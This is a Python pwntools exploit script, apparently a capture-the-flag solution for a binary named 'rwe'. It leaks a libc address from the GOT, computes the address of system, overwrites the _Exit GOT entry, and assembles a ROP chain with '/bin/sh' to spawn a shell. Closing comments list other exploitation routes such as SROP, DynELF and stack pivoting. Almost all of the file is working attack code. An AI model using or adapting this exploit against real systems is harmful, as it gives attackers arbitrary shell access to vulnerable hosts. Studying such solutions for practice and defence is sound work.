#!/usr/bin/python -i

from pwn import *

DEBUG = True
execname = './rwe'
remoteip = '0.0.0.0'
port = 12346

context.arch = 'amd64'

env = {}

USE_MY_LIBC = True

if USE_MY_LIBC:
    libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
else:
    libc_path = os.getcwd() + '/libc.so.6'
    env['LD_PRELOAD'] = libc_path

libc = ELF(libc_path)

system_offset = libc.symbols['system']
__libc_start_main_offset = libc.symbols['__libc_start_main']
puts_offset = libc.symbols['puts']

if DEBUG:
    r = process(execname, env=env)
    gdb.attach(r)
    raw_input('continue gdb ->')
    context.log_level = 'DEBUG'
else:
    r = remote(remoteip, port)

ret = 0x400286

main_nopush = 0x4005b7

pop2 = 0x400690
pop6 = 0x40068a
pop7 = 0x400686
pop_rsp_3reg = 0x40068d
pop_rdi = 0x400693

__libc_start_main_gotentry = 0x601020
_Exit_gotentry = 0x601030


def readmem(addr):
    r.sendline(str(addr))
    return int(r.recvline()[2:].strip(), 16)


def writemem(addr, val):
    r.sendline(str(addr))
    r.sendline(str(val))


__libc_start_main_addr = readmem(__libc_start_main_gotentry)

libc_base = __libc_start_main_addr - __libc_start_main_offset

system_addr = libc_base + system_offset

writemem(_Exit_gotentry, main_nopush)  # start over

stack_top = 0x601800

binsh_long = u64('/bin/sh\0')

#rop = [binsh_long,stack_top]

#for i in range(len(rop)):
#    readmem(0x400000)
#    writemem(stack_top + i * 8, rop[i])

readmem(system_addr)
writemem(stack_top, pop2)

readmem(pop_rdi)
writemem(stack_top, pop2)

readmem(pop_rdi)
writemem(stack_top, binsh_long)

readmem(pop_rdi)
writemem(stack_top - 0x100, pop7)

readmem(0x400000)
writemem(_Exit_gotentry, pop6)  # trigger rop

# Magic gadget is possible
# you can read out every possible address including vdso.
# you can also dynelf
# you can srop since you can access to syscall
# you can rop directly if you choose the stack layout carefully
# you can also bruteforce the syscall
# _Exit must have some syscall nearby?
# you can move the stack to another address to do rop
